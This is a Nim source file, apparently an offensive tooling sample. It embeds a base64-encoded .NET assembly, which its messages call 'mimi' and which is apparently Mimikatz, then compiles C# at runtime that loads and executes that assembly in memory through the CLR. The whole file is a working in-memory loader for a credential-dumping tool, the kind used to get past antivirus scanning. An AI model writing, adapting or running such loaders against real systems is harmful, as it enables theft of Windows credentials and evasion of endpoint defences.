
import winim/clr
import strformat
import system
import strutils
import winim
import winim/com
import winim/lean

const b64assembly = staticRead"KatzB64.dat"

var code = """
using System;
using System.Reflection;

public class Program
{
    public void Main()
    {
        Assembly assembly = Assembly.Load(Convert.FromBase64String("Properties.Resources.download"));
        Type type = assembly.GetType("KatzAssembly.ClassInteractive");
        object instanceOfMyType = Activator.CreateInstance(type);
    }
}

""".replaceWord("Properties.Resources.download",b64assembly)


when isMainModule:
  MessageBox(0, fmt"[*] Click OK and i try to load mimi", "Nim is Powerful", 0)

  echo "[*] Installed .NET versions"
  for v in clrVersions():
    echo fmt"    \--- {v}"
  echo "\n"

  var res = compile(code)
  var o = res.CompiledAssembly.new("Program")
  echo fmt"I compile class with mimi{'\n'}class = {o}{'\n'}Ready to execute"  
  MessageBox(0, fmt"I compile class with mimi{'\n'}class = {o}{'\n'}Ready to execute{'\n'}" , "Nim is Powerful", 0)

  o.Main()